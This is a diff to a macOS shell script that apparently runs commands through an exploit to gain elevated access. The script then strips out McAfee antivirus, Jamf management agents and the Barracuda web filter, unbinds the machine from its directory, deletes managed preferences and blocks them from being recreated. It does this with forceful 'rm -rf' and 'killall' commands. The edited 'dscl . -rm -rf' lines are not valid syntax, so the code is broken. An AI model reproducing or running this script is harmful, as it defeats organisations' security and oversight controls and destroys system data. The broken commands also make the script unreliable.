@@ -36,11 +36,7 @@ osascript -e 'display notification "Keeping access open. Force quit when done." 
 "$exploit" <<EOF
 if [[ $elim == true ]]; then
 
-function delete {
-    rm -rfv "$@"
-}
-
-delete /Applications/McAfee* \
+rm -rf /Applications/McAfee* \
     /Library/McAfee* \
     /Library/Application\ Support/McAfee* \
     /usr/local/McAfee \
@@ -49,14 +45,14 @@ delete /Applications/McAfee* \
 
 dsconfigad -remove -force -u "user" -p "password"
 
-delete /Library/Managed\ Preferences
-dscl . -delete /Computers
-dscl . -delete /Users/$user dsAttrTypeStandard:MCXSettings
+rm -rf /Library/Managed\ Preferences
+dscl . -rm -rf /Computers
+dscl . -rm -rf /Users/$user dsAttrTypeStandard:MCXSettings
 # Prevent the directory from being recreated; it shouldn't be
 ln -s /dev/null /Library/Managed\ Preferences
 
 for _ in {1..8}; do killall jamf jamfAgent 2>/dev/null; done
-delete /usr/local/bin/jamf* \
+rm -rf /usr/local/bin/jamf* \
     /Library/LaunchAgents/com.jamfsoftware* /Library/LaunchDaemons/com.jamfsoftware* \
     /private/var/db/receipts/com.jamfsoftware* \
     /private/var/root/Library/{Caches,Cookies,Preferences}/com.jamfsoftware* \
@@ -69,7 +65,7 @@ delete /usr/local/bin/jamf* \
     /Library/Application\ Support/JAMF
 
 killall wsa_proxy
-delete /Library/Application\ Support/Barracuda\ WSA \
+rm -rf /Library/Application\ Support/Barracuda\ WSA \
     /Library/Extensions/BarracudaWSA.kext \
     /Library/Logs/BarracudaWSA* \
     /Library/PreferencePanes/Barracuda\ WSA* \
